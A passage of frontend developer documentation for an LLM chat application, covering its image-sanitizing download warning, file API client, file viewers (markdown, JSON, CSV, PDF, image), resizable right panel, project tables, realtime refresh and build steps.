4. For a warning with `sanitizer` the dialog is titled "This image may carry hidden data", explains what the sanitized copy keeps and drops (`SANITIZED_IMAGE_EXPLANATION`, boxed `.download-warning-sanitized`) and has three actions: Cancel, "Download Original..." (`DocConfirmDialog`'s optional `secondaryLabel` / `onSecondary`) and the primary "Download Sanitized Copy" (resolves `'sanitized'`). "Download Original..." swaps in a second, danger-toned `DocConfirmDialog` ("Download the original file?") whose "Download Original" button stays disabled (`confirmDisabled`) until the "I understand this file was not inspected ... and I know what I am doing" checkbox (`.download-warning-ack`) is ticked; Cancel or Escape there returns to the first dialog with the checkbox cleared, so the sanitized copy is still one click away. A sanitized fetch that fails (400 `unsanitizable_image`: the bytes are not a PNG/JPEG/GIF/WebP whatever the name says) surfaces through the caller's usual error path, never as a silent fallback to the original.

**Behaviour notes:**
- No remember-me: the dialog shows on every download by design (a file can be planted at any point of a conversation). A second request while one is open cancels the first and takes the dialog over.
- The warning usually opens over another `ModalShell` (the file viewer, an approval card preview). Both shells close on a document-level bubble-phase Escape listener, so the provider claims Escape in the capture phase while the dialog is open (`stopPropagation` there keeps every bubble listener from running, see `ModalShell.tsx`) and cancels only the warning.
- This is a UX gate on the frontend only: the `/files/download` route is unchanged and a direct URL fetch is not warned. The server-side sanitization exists for raster images only (`/files/download-sanitized`); other types, and any ban, are the planned follow-up.
- Quest Docs downloads (`DocHeader.tsx` md/zip links, `DocImageLightbox.tsx` asset link, `DocDraftRecovery.tsx`) are NOT behind the warning: docs are the low-hidden-data-capacity channel that future work may force exports through.

Tests: `frontend/src/utils/downloadWarnings.test.ts` (the rule) and `frontend/src/contexts/DownloadWarningContext.test.tsx` (dialog, resolution, Escape layering, `useWorkspaceDownload` fetching only after an acknowledgement).

#### 4. File API Client (`src/api/fileApi.ts`)

Type-safe API client functions for file operations. Upload functions use XMLHttpRequest via the `xhrUpload()` helper instead of fetch() to support real-time upload progress events.

**Functions**:
- `xhrUpload(url, formData, onProgress)`: Internal helper that performs file uploads via XMLHttpRequest with cookie auth. Accepts an optional `onProgress` callback receiving `(loaded, total)` byte counts from `xhr.upload.onprogress`. Returns a Promise.
- `listFiles(conversationId, path)`: List files at path (cookie auth via `credentials: 'include'`)
- `uploadFiles(conversationId, files, path, onProgress)`: Upload flat files via XHR. Accepts optional `onProgress` callback for upload progress tracking.
- `uploadFilesWithPaths(conversationId, files, path, onProgress)`: Upload files with relative paths for folder uploads via XHR. Sends parallel `files` and `paths` form data arrays so the backend can recreate directory structure. Accepts `FileWithPath[]` from `frontend/src/utils/directoryTraversal.ts`. Accepts optional `onProgress` callback.
- `downloadFile(conversationId, filePath, variant?)`: Fetch a file as a blob URL + filename (cookie auth via `credentials: 'include'`); does NOT trigger the browser download itself. `variant` is a `DownloadVariant`: `'original'` (default, `/files/download`) or `'sanitized'` (`/files/download-sanitized`, the server's metadata-stripped copy of a raster image)
- `downloadFolder(conversationId, folderPath)`: Same for a folder as a zip archive (`{folder-name}.zip`)
- `saveBlobToDisk({url, filename})`: Temporary `<a download>` click + deferred `URL.revokeObjectURL`. Every workspace download ends here, and callers reach it only through `useWorkspaceDownload` / `useFileBrowser`, i.e. after the download warning (see [Workspace Download Warning](#workspace-download-warning)).
- `fetchFileContent(conversationId, filePath)`: Fetch text content of a viewable file (cookie auth via `credentials: 'include'`). Returns `FileContentResponse`.
- `getFileInfo(conversationId, filePath)`: Get file/folder info with file count (cookie auth via `credentials: 'include'`). Returns `FileInfoResponse`.
- `deleteFile(conversationId, filePath)`: Delete a file or folder (cookie auth via `credentials: 'include'`). Returns `DeleteFileResponse`.
- `createFolder(conversationId, parentPath, name)`: Create a new empty folder under `parentPath` (cookie auth via `credentials: 'include'`). Returns `CreateFolderResponse`.

**Response Types**:
- `FileEntry`: File/folder metadata (name, is_dir, size, modified)
- `FileContentResponse`: Text file content (name, path, content, size)
- `FileInfoResponse`: File/folder info with file count (name, type, file_count)
- `DeleteFileResponse`: Deletion result (name, type, deleted_count)
- `CreateFolderResponse`: Created folder metadata (name, path)

#### 5. FileViewerModal Component (`src/components/FileViewerModal.tsx`)

Full-screen modal for viewing text files, JSON files, images, PDFs, and CSVs inline, with a Save to Drive option for markdown files, an HTML-rendered view for markdown files, and a sortable-table view for CSV files.

**Props Interface**:
- `isOpen`: Whether the modal is visible
- `conversationId`: Conversation that owns the file
- `filePath`: Full path within workspace (e.g., `/script.py`)
- `fileName`: Display name for the header
- `isImage`: Whether the file is an image (determines rendering mode)
- `isJson`: Whether the file is JSON (renders via `JsonTreeViewer` instead of `<pre>`)
- `isPdf`: Whether the file is a PDF (renders via `PdfViewer` instead of `<pre>`)
- `isCsv`: Whether the file is a CSV (renders as a sortable table instead of `<pre>`)
- `onClose`: Callback to close the modal
- `onDownload`: Callback to trigger the existing download flow

**Behavior (text files)**:
- Fetches file content via `fetchFileContent()` from `frontend/src/api/fileApi.ts` when opened
- Renders raw text in a scrollable `<pre>` element

**Behavior (markdown files -- `.md`)**:
- Fetches content via `fetchFileContent()` like other text files (no backend change -- the `/files/content` text endpoint already serves `.md`)
- Renders as HTML **by default** via `react-markdown` with the same plugin set as the chat renderer (`remark-gfm`, `remark-breaks`, `rehype-highlight`) and the shared `markdownComponents` object imported from `Message.tsx`; react-markdown is safe by default (no `rehype-raw`, no `dangerouslySetInnerHTML`)
- A "Show rendered" sliding toggle in the title bar (right of the Save to Drive button, markdown-only) flips between the rendered HTML view and the raw `<pre>` source; default is rendered (switch on), reset to default on each newly-opened file (`showRendered` state)
- Rendered output is wrapped in `.file-viewer-markdown` and styled in `FileViewerModal.css`

**Behavior (JSON files)**:
- Fetches content via `fetchFileContent()` like other text files
- Parses JSON and renders via `JsonTreeViewer` (`frontend/src/components/JsonTreeViewer.tsx`): a recursive collapsible tree with syntax coloring, expand/collapse toggles, and item count badges
- Falls back to raw `<pre>` display if the JSON is malformed (parse fails)

**Behavior (CSV files -- `.csv`)**:
- Fetches content via `fetchFileContent()` like other text files (no backend change -- `.csv` is in `VIEWABLE_EXTENSIONS`, subject to the 1 MB `MAX_VIEW_SIZE` cap)
- Parses client-side with `parseCsv()` from `frontend/src/utils/csv.ts` (RFC-4180-aware, never throws) and renders as a styled sortable table reusing the project-tables visual styling (`.file-viewer-csv-*` classes)
- Sticky headers with a 3-state sort cycle (none -> asc -> desc -> none) copied from `TableViewerModal.handleSort`; sorting is numeric-aware (empties sorted last) and done client-side
- Cell values truncated at 200 chars with the full text in a `title` tooltip; a 5000-row render cap (`CSV_MAX_RENDER_ROWS`) shows a footer note pointing at Download for the full file; header-only files show a "No data rows." note
- A "Show raw" header toggle (mirroring the markdown "Show rendered" toggle) flips to the raw `<pre>` source; a parse failure also falls through to the raw `<pre>`

**Behavior (images)**:
- Fetches image as a blob via the existing download endpoint for accurate file size
- Renders via an object URL in an `<img>` element
- Checkerboard background for transparency visibility (defined in `FileViewerModal.css`)
- Responsive scaling: images fit the modal without exceeding their native resolution
- Title bar displays image dimensions (width x height) and file size
- Object URL revoked on cleanup to prevent memory leaks

**Behavior (PDF files)**:
- Fetches the whole file as an `ArrayBuffer` via the existing cookie-authed download endpoint (`GET /files/download`); the `/files/content` text endpoint is restricted to text extensions, so PDFs reuse the download path the same way images do
- Refuses to preview files over `PDF_MAX_PREVIEW_BYTES` (100 MB, checked against both the `Content-Length` header and the actual buffer) and shows an error pointing the user at Download instead
- Hands the buffer to `PdfViewer` and receives `numPages` back via the `onMetadata` callback; the title bar shows "N pages · size"
- The modal content area uses the `file-viewer-content--pdf` variant so the viewer fills it edge-to-edge

**Behavior (Save to Drive -- `.md` files only)**:
- A "Save to Drive" button appears in the title bar next to the download button when viewing a `.md` file
- Clicking the button opens a naming dialog, prefilled from the filename with underscores replaced by spaces
- On confirm, calls `saveToDrive()` from `frontend/src/api/fileApi.ts` which POSTs to `/app/api/conversations/{id}/files/save-to-drive`
- The raw markdown is uploaded to Google Drive via multipart upload; Google natively converts it to a Google Document
- On success, the dialog shows a link to open the created document in Google Docs
- See [Drive API - Save to Drive](../api/drive-api.md#save-to-drive-via-file-browser) for backend details

**Shared behavior**:
- Download button next to the filename in the header
- Close via Escape key, close button, or clicking the overlay background
- Loading and error states while content is fetched
- Rendered via `createPortal` to `document.body` for proper full-screen overlay
- Cleanup on close: content, error, and image state reset when `isOpen` becomes false

**Integration**: `FileBrowser.tsx` manages the `viewerFile` state (`{ path, name, isImage, isJson, isPdf, isCsv } | null`). Clicking a viewable file sets this state (with `isImage` derived from `IMAGE_EXTENSIONS`, `isJson` derived from `isJsonFile()`, `isPdf` derived from `isPdfFile()`, and `isCsv` derived from `isCsvFile()`), which opens the modal. The modal's `onDownload` delegates to the existing `downloadFile()` from `useFileBrowser`.

#### 6. PdfViewer Component (`src/components/PdfViewer.tsx`)

In-modal PDF preview built directly on pdfjs-dist (no wrapper library). Receives the raw `ArrayBuffer` from `FileViewerModal` plus an `onMetadata` callback for reporting the page count.

**Layout**: two panes -- a left thumbnail rail (fixed-width thumbnails, click to jump to a page, current page highlighted and auto-scrolled into view) and a fit-to-width main page scroller. Page dimensions are read up front from the page proxies so every page gets a correctly-sized placeholder before its canvas renders.

**Rendering strategy** (all in `PdfViewer.tsx`):
- Pages and thumbnails render lazily into canvases via `IntersectionObserver`s (main pages pre-render one viewport ahead, thumbnails further), so large documents don't kick off hundreds of render tasks at open
- A second observer evicts far-offscreen main-page canvases (resetting them to placeholders) to bound bitmap memory; in-flight render tasks for a canvas are cancelled before re-render, and `RenderingCancelledException` is expected and swallowed
- Canvas backing-store resolution follows `devicePixelRatio` capped at 2 (`getDpr()`)
- The current page for the scroll-spy highlight is recomputed in a `requestAnimationFrame`-throttled scroll handler
- Fit-to-width rescaling re-renders visible pages when the container width changes

**Error states**: password-protected documents (`PasswordException`) and corrupt/unparseable documents get dedicated load-error messages; a single page that fails to render shows a per-page error placeholder without breaking the rest of the document.

**Self-hosted assets**: the worker URL comes from a Vite `?url` import of `pdfjs-dist/build/pdf.worker.min.mjs` (assigned to `GlobalWorkerOptions.workerSrc`), and the cmaps / standard fonts / wasm / icc profiles are referenced from `/assets/pdfjs/` via the `PDF_DOCUMENT_OPTIONS` constant -- the single `getDocument` option site so a second call site can't drift. See the Vite Configuration section above for how these land in `dist/`.

**Buffer ownership**: the component copies the incoming `ArrayBuffer` (`data.slice(0)`) before handing it to `getDocument`, because pdf.js transfers the bytes to its worker (neutering the source) and React StrictMode mounts effects twice in dev -- the second mount would otherwise receive a detached buffer.

#### 7. RightPanel Component (`src/components/RightPanel.tsx`)

Wrapper component that replaced the direct `<FileBrowser>` usage in `App.tsx`. Receives both `conversationId` and the URL-derived `projectId` as props, and reads `drilledProjectId` from `ProjectsContext`.

**Behavior**:
- Card set by what is on screen (see the table at the top of this section): one card for a standalone chat or nothing, two for the drilled home composer, three for a project conversation
- Cards are flex items weighted by their share of the cards' free space (panel height minus padding and gaps; percentages summing to 100), each with an 80px `min-height`; each gap between two cards is a pointer-event drag handle (`setPointerCapture`, `touch-action: none`, so touch drags work in the MobileShell drawer too) that moves only the boundary between its two neighbours, delta-based so pointer-down never jumps
- The split is persisted to `localStorage` per project, one key per layout: the two-card layout keeps `quest_project_tables_split_{projectId}` (top card's percentage, default 60%); the three-card layout uses `quest_project_panel_split3_{projectId}` (JSON `[chatPercent, projectPercent]`, Tables takes the rest, default `[40, 35]`) and, until first dragged, derives its shares from the two-card key (Tables keeps its old share, the file area is split evenly); loaded shares are renormalised so none is below 5% (garbage or out-of-range values fall back to the defaults), and a split is saved only when a drag actually moved it
- During a drag the 80px minimum is measured against the free space; a pair of cards too small for two minimums is split evenly
- FileBrowser.css uses flex layout (dimensions controlled by RightPanel) rather than fixed width/height

**Floating cards**:
- The `.right-panel` column is a transparent gutter (padding on the top/right/bottom, none on the left) hosting each unit -- FileBrowser and ProjectTables -- as a `.right-panel-card` (raised `--surface-raised` background, `--border` edge, 12px radius, `--shadow-card`); `FileBrowser.css` / `ProjectTables.css` containers are transparent and their `h3` titles are small uppercase labels
- Both resize affordances are invisible until needed: the left-edge width handle (`.right-panel-resize-handle`, 12px hit area straddling the panel edge) and each gap between two cards (`.right-panel-divider`, `row-resize`) draw a short pill via `::after` that fades in while the panel is hovered, turns accent on handle hover (and on the divider being dragged, `.active`), and stays visible during a drag via the `resizing-width` / `resizing-split` classes RightPanel sets on the container from a `resizing` state

**Horizontal resize**:
- The panel's width is user-adjustable via the `col-resize` drag handle on its LEFT edge (`.right-panel-resize-handle`)
- The width is persisted browser-wide (not per-conversation or per-project) in `localStorage` under the key `quest_right_panel_width`, so the chosen width applies across all conversations in that browser
- 280px (the prior fixed width) is now both the default and the minimum; the maximum is viewport-relative (`Math.min(700, window.innerWidth - 600)`)
- The stored width is read on mount only -- no cross-tab live sync
- A window `resize` listener (removed on unmount) re-clamps an over-wide stored width down to fit smaller viewports

#### 8. ProjectTables Component (`src/components/ProjectTables.tsx`)

Lists user-created tables in the project's SQLite database. Rendered as the bottom card of the RightPanel for project conversations and for the home composer drilled into a project.

**Props**: `projectId` (string or null; renders nothing when null)

**Features**:
- Displays table names with table icons; clicking a table opens `TableViewerModal`
- Meatball menu (three-dot icon) on each table entry, appears on hover; contains "Delete table" option with `window.confirm()` confirmation dialog
- Click-outside-to-close behavior on the meatball menu
- Manual refresh button in the header
- Auto-refreshes on the `WebSocketManager.onStreamComplete` callback (`send_message_finished`) via silent reload at end-of-turn. Unlike the FileBrowser, the project DB does not yet have a dedicated mutation event -- a future refinement could mirror the `file_list_changed` pattern with a `project_db_changed` global
- Loading, error, and empty states

**API**: Uses `fetchProjectTables()` and `deleteProjectTable()` from `frontend/src/api/projectDbApi.ts`. Types in `frontend/src/api/types.ts` (`ProjectTable`, `ProjectTablesResponse`).

#### 9. TableViewerModal Component (`src/components/TableViewerModal.tsx`)

Full-screen modal for viewing table data, rendered via `createPortal` to `document.body` (same portal pattern as `FileViewerModal`).

**Props**: `isOpen`, `projectId`, `tableName`, `onClose`

**Features**:
- Sticky column headers
- Pagination with Previous/Next buttons (page size 100, configurable via `PAGE_SIZE` constant)
- Shows "Showing N-M of T" row range indicator
- NULL values styled distinctly (`.cell-null` CSS class)
- Long cell values truncated at 200 characters (`MAX_CELL_LENGTH`) with full text shown in a `title` tooltip
- Close via Escape key, close button, or overlay click

**API**: Uses `fetchTableData()` from `frontend/src/api/projectDbApi.ts`. Response type is `TableDataResponse` in `frontend/src/api/types.ts`.

### Integration with the Realtime Bus

Both the file browser and project tables auto-refresh when the LLM (or another tab) modifies files or database tables, but on different signals:

1. **FileBrowser** subscribes to `persistentWebSocket.onGlobalEvent` and listens for `file_list_changed` envelopes.
   - The backend emits this event from each workspace-mutating tool handler (`write_workspace_file`, `edit_workspace_file`, `download_drive_file`, `google_export_doc`, `github_get_job_log`, `run_script`, `run_python`) on a successful write, and from the three mutating REST routes (`upload_files`, `delete_file`, `create_folder`) for multi-tab consistency.
   - The FE filters by active `conversation_id` for `scope === "conversation"` envelopes and by active `project_id` for `scope === "project"` envelopes, debounces bursts within a 200ms window, and calls `silentRefresh()`. This refreshes the file list mid-turn after each write rather than waiting for the streaming lifecycle to end. See [Realtime Architecture](realtime.md#backend-publish-sites-per-user-globals).
2. **ProjectTables** subscribes to `WebSocketManager.onStreamComplete` (i.e. `send_message_finished`) and calls `loadTables(true)` for a silent reload at end-of-turn.

The silent refresh approach prevents UI flickering during active chat sessions by keeping the existing list visible while new data loads in the background (stale-while-revalidate pattern). Subscribing directly to realtime events instead of using context-level triggers avoids unnecessary re-renders of unrelated components.

### App Layout Integration

The App component now uses a three-column layout:

```
app-container
├── Sidebar (260px fixed width)
│   ├── Brand bar (logo + name, search icon, requests inbox icon with badge)
│   ├── Projects section (always visible)
│   │   └── Drill-down: Routines section (always visible) + Conversations section
│   └── Conversations list with inline "New Chat" button
├── main-content (flex-grow)
│   ├── ChatPanel (message display and input)
│   └── HomeComposer (if no conversation)
└── RightPanel (right panel; Chat Files / Project Files / Tables cards by what is on screen; horizontally resizable via left-edge handle, width persisted browser-wide to localStorage)
    ├── Left-edge horizontal-resize handle (col-resize)
    ├── FileBrowser (Chat Files card and/or Project Files card, see Right Panel)
    │   ├── Navigation controls
    │   ├── Current path
    │   ├── File list (click viewable text, image, PDF, or CSV files to open modal)
    │   └── FileViewerModal (portal to document.body, full-screen overlay; text, image, PDF via PdfViewer, or CSV-as-sortable-table rendering)
    ├── Draggable divider (if project conversation; split persisted to localStorage)
    └── ProjectTables (bottom card, project conversation or drilled home composer)
        ├── Table list (auto-refreshes on WebSocket events)
        └── TableViewerModal (portal to document.body; table data with pagination)
```

### Data Flow

**Listing Files**:
```
1. User selects conversation
2. FileBrowser mounts with conversationId
3. useFileBrowser calls listFiles()
4. GET /app/api/conversations/{id}/files?path=/
5. Backend validates path within workspace
6. Backend returns file metadata array
7. FileBrowser renders file list
```

**Uploading Files (flat)**:
```
1. User drops file(s) or clicks upload button
2. FileBrowser.handleDrop() calls extractFilesFromDataTransfer() (directoryTraversal.ts)
3. If any file has a relative path with "/" (folder upload), useFileBrowser calls uploadFilesWithPaths()
4. Upload sent via xhrUpload() (XMLHttpRequest) for progress tracking
5. xhr.upload.onprogress fires → uploadPercent state updates → progress bar and percentage text render
6. POST /app/api/conversations/{id}/files/upload?path=/current with files + paths form data
7. Backend validates file size against MAX_FILE_SIZE (200MB) and saves files to workspace
8. useFileBrowser calls refresh()
9. File list updated; uploadPercent reset to null
10. If partial failures, buildUploadErrorMessage() formats error summary for display
```

**Uploading Folders (drag-and-drop)**:
```
1. User drops folder on FileBrowser
2. FileBrowser.handleDrop() calls extractFilesFromDataTransfer() (directoryTraversal.ts)
3. extractFilesFromDataTransfer() uses webkitGetAsEntry() to recursively traverse directories
4. .DS_Store files are filtered out via IGNORED_FILENAMES set
5. Returns FileWithPath[] with relative paths (e.g., "folder/sub/file.txt")
6. useFileBrowser.uploadFilesWithPaths() sends files + paths arrays via xhrUpload()
7. Upload progress tracked via onProgress callback → uploadPercent state → progress bar
8. Backend validates each file against MAX_FILE_SIZE (200MB) and uses save_uploaded_file_with_path() to recreate directory structure
9. File list refreshes showing new folder hierarchy
```

**Viewing Text File Content**:
```
1. User clicks a .md, .py, .txt, or .json file in the file list
2. FileBrowser.handleItemClick() checks isViewableFile() (matches TEXT_EXTENSIONS)
3. Sets viewerFile state with path, name, isImage: false, and isJson flag
4. FileViewerModal opens, calls fetchFileContent() from fileApi.ts
5. GET /app/api/conversations/{id}/files/content?path=/file.py
6. Backend validates path, checks extension against VIEWABLE_EXTENSIONS, checks size against MAX_VIEW_SIZE (1MB)
7. Returns JSON with name, path, content, size
8. For JSON files: parses content and renders via JsonTreeViewer (collapsible tree); falls back to <pre> on parse failure
   For other text files: renders content in scrollable <pre> element
9. User can download via header button or close via Escape / overlay click / close button
```

**Viewing Image Files**:
```
1. User clicks an image file (.png, .jpg, .jpeg, .gif, .svg, .webp, .bmp, .ico, .avif)
2. FileBrowser.handleItemClick() checks isViewableFile() (matches IMAGE_EXTENSIONS)
3. Sets viewerFile state with path, name, and isImage: true
4. FileViewerModal opens, fetches image as blob via download endpoint
5. GET /app/api/conversations/{id}/files/download?path=/chart.png
6. Response blob converted to object URL and rendered in <img> element
7. Image onload reads naturalWidth/naturalHeight; blob provides file size
8. Title bar shows filename, dimensions (W×H), and file size
9. Image displayed with checkerboard background and responsive scaling
10. User can download via header button or close via Escape / overlay click / close button
```

**Viewing PDF Files**:
```
1. User clicks a .pdf file in the file list
2. FileBrowser.handleItemClick() checks isViewableFile() (matches PDF_EXTENSIONS)
3. Sets viewerFile state with path, name, and isPdf: true
4. FileViewerModal opens, fetches the file as an ArrayBuffer via the download endpoint
5. GET /app/api/conversations/{id}/files/download?path=/report.pdf
6. Size checked against PDF_MAX_PREVIEW_BYTES (100 MB); oversize shows an error pointing at Download
7. Buffer handed to PdfViewer, which copies it and calls pdf.js getDocument (self-hosted worker + assets)
8. Thumbnail rail and fit-to-width pages render lazily via IntersectionObservers; scroll-spy tracks the current page
9. PdfViewer reports numPages via onMetadata; title bar shows "N pages · size"
10. User can download via header button or close via Escape / overlay click / close button
```

**Viewing CSV Files**:
```
1. User clicks a .csv file in the file list
2. FileBrowser.handleItemClick() checks isViewableFile() (matches CSV_EXTENSIONS)
3. Sets viewerFile state with path, name, and isCsv: true
4. FileViewerModal opens, calls fetchFileContent() (same text-content endpoint as other text files)
5. GET /app/api/conversations/{id}/files/content?path=/data.csv (.csv is in VIEWABLE_EXTENSIONS; 1MB MAX_VIEW_SIZE cap)
6. parseCsv() (frontend/src/utils/csv.ts) parses the raw text client-side
7. Renders as a styled sortable table; sticky headers cycle none->asc->desc->none on click (numeric-aware, empties last)
8. Rows capped at 5000 (CSV_MAX_RENDER_ROWS) with a footer note; "Show raw" toggle or a parse failure falls back to <pre>
9. User can download via header button or close via Escape / overlay click / close button
```

**Downloading Folders as Zip**:
```
1. User clicks the meatball menu (three-dot icon) on a folder
2. User selects "Download as Zip" from the menu
3. useFileBrowser.downloadFolder() sets zippingFolder state (shows notification bar)
4. downloadFolder() from fileApi.ts is called
5. GET /app/api/conversations/{id}/files/download-folder?path=/folder
6. Backend creates temporary zip via create_folder_zip() in file_storage.py
7. Returns zip as FileResponse; BackgroundTask cleans up temp file
8. Browser initiates download of {folder-name}.zip
9. zippingFolder state cleared (notification bar disappears)
```

**Deleting Files/Folders**:
```
1. User clicks the meatball menu (three-dot icon) on a file or folder
2. User selects "Delete" from the menu
3. useFileBrowser.deleteItem() calls getFileInfo() from fileApi.ts
4. GET /app/api/conversations/{id}/files/info?path=/item
5. Backend returns name, type, and file_count
6. window.confirm() shows confirmation; for folders, includes file count (e.g., "This will delete 5 files.")
7. On confirm, deleteFile() from fileApi.ts is called
8. DELETE /app/api/conversations/{id}/files?path=/item
9. Backend deletes the file or folder (recursively for folders)
10. useFileBrowser calls refresh() to update the file list
```

**Auto-Refresh (Silent)**:
```
1. LLM executes a workspace-mutating tool (e.g., write_workspace_file, run_script)
   or another tab POSTs upload / delete / create-folder
2. Backend tool handler / REST route publishes file_list_changed via bus.publish_to_user
3. PersistentWebSocket forwards the per-user global to onGlobalEvent listeners
4. FileBrowser (subscribed directly) filters by active conversation_id (scope="conversation")
   or active project_id (scope="project")
5. 200ms debounce coalesces bursts (e.g., ten write_workspace_file calls in one turn)
6. silentRefresh() called (no loading spinner shown)
7. Files fetched in background, existing list stays visible
8. Updated file list replaces stale data seamlessly
```

### Design Decisions (PDF Preview)

**Why pdfjs-dist directly instead of a wrapper library (react-pdf etc.)?**
The viewer needs fine-grained control over lazy rendering, canvas eviction, and asset URLs; a wrapper adds a dependency layer without removing any of that work. Pinning the exact pdfjs-dist version guarantees the bundled worker and the main-thread library can never mismatch.

**Why self-host the pdf.js worker and assets?**
The deployment has no network egress, so CDN-served workers/cmaps/fonts would fail at runtime. Everything is bundled into `dist/assets/` at build time (see Vite Configuration above).

**Why fetch PDFs through the download endpoint?**
Same rationale as images: the existing cookie-authed download endpoint already serves the bytes with no backend changes. The text-content endpoint is restricted to text extensions by design.

**Why lazy canvas rendering and eviction?**
Rendering every page of a large PDF at open would spawn hundreds of render tasks and hold every page bitmap in memory. IntersectionObservers render only near-viewport pages and evict far-offscreen canvases, keeping memory bounded for arbitrarily long documents (combined with the DPR cap of 2).

### Design Decisions (CSV Preview)

**Why parse and sort CSV client-side instead of a backend query layer?**
Unlike project tables (which sort server-side via SQLite `ORDER BY`; see [Project DB](project-db.md)), a CSV file is just bytes on disk with no backing database. The whole file already arrives via the existing text-content endpoint (capped at `MAX_VIEW_SIZE` = 1 MB), so parsing and sorting in the browser avoids any new backend endpoint or query plumbing. The 5000-row render cap (`CSV_MAX_RENDER_ROWS`) bounds DOM size for files near the size cap, with Download offered for the full file.

**Why a dependency-free parser (`frontend/src/utils/csv.ts`)?**
The parser is RFC-4180-aware (quoted fields with embedded commas/newlines, `""` escapes, mixed line endings, ragged rows) and never throws -- on any malformed input the modal falls through to the raw `<pre>` view, the same fallback used for malformed JSON. A hand-rolled parser keeps the bundle lean and the failure mode predictable.

## Running the Frontend

### Building

Build the frontend for serving by FastAPI:

```bash
cd frontend
npm run build
```

Output will be in `frontend/dist/` directory. The `run.py` script handles this automatically.

### Running the Application

Use `run.py` to build and start the full application:

```bash
python3 run.py --dev    # Development mode (port 9000)
python3 run.py --prod   # Production mode (port 8000)
```

## Troubleshooting

### TypeScript Errors

Run type checking (both the app and the Vite config project):
```bash
npm run typecheck
```

ESLint (TypeScript + React hook rules) runs separately with `npm run lint`; see [Development Workflows](../setup/development-workflows.md#frontend-checks).

## Performance Considerations

### Render Optimization

The frontend uses a layered memoization strategy to prevent unnecessary re-renders and screen flicker. The approach targets three sources of wasted renders: cross-conversation store updates, unstable context values, and unstable callback props.

**Per-conversation snapshots** -- `conversationStore.getConversationSnapshot(id)` in `frontend/src/store/conversationStore.ts` returns the state reference for a single conversation. The `useConversation` hook in `frontend/src/hooks/useConversation.ts` passes this as the snapshot function to `useSyncExternalStore`, so components only re-render when their specific conversation changes, not when any conversation in the store changes.

**Context value memoization** -- Every provider under `frontend/src/contexts/` owns one responsibility (see Application Contexts) and wraps its `value` in `useMemo`, so context consumers only re-render when a value they depend on actually changes.

**Component memoization via `React.memo`** -- Key components are wrapped with `React.memo` to skip re-renders when their props have not changed:
- `Sidebar` in `frontend/src/components/Sidebar.tsx`
- `ChatPanel` in `frontend/src/components/ChatPanel.tsx`
- `MessageContentRenderer` in `frontend/src/components/Message.tsx`
- `ActionRequestMessage` in `frontend/src/components/ActionRequestMessage.tsx`

**Stable callback references** -- `App.tsx` wraps `handleConversationSelect` and `handleNewConversation` in `useCallback` so that `Sidebar` (wrapped in `React.memo`) receives stable function references and does not re-render when `AppContent` re-renders.

**Isolated polling via component extraction** -- The `RequestsBadge` component in `frontend/src/components/Sidebar.tsx` encapsulates its own refresh state (event-driven via `requestEvents.ts` + 30-second polling fallback + visibility-change refresh). Because it is a separate component, count updates re-render only the badge, not the entire Sidebar. The event emitter lives outside the React context system to avoid cascading re-renders.

### Build Performance

- **esbuild**: 10-100x faster than Babel/Webpack for transpilation
- **Native ESM**: Modern module-based architecture
- **Tree-shaking**: Unused code removed during build

### Production

- **Code Splitting**: Automatic chunk splitting
- **Tree Shaking**: Unused code eliminated
- **Minification**: JavaScript and CSS minified
- **Asset Optimization**: Images and fonts optimized
- **Source Maps**: Optional, enabled by default

## Future Frontend Enhancements

Potential improvements:

1. **Testing**
   - Vitest for unit tests
   - React Testing Library
   - E2E tests with Playwright
   - API client mocking strategies

2. **Performance Optimizations**
   - Message virtualization for long conversations
   - Caching strategies
